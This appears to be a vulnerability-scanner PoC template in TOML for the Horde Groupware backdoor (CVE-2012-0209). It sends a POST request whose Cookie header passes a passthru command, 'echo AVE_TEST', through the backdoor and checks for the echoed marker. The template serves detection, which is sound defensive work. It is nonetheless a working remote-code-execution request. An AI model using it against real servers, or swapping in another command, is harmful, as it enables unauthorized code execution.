@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "检测Horde 3.3.12/Groupware 1.2.10后门漏洞。通过向services/javascript.php发送特制POST请求并携带恶意Cookie头，验证目标是否存在open_calendar.js后门文件，可导致任意PHP代码执行。"
+id = "POC-AVE-2012-0028"
+name = "Horde Groupware 后门任意PHP代码执行漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2012-0209",
+    "horde",
+    "backdoor",
+    "rce",
+]
+vuln_id = [
+    "CVE-2012-0209",
+    "AVE-2012-0028",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/services/javascript.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "app=horde&file=open_calendar.js"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Cookie = "href=passthru:echo AVE_TEST"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST"]
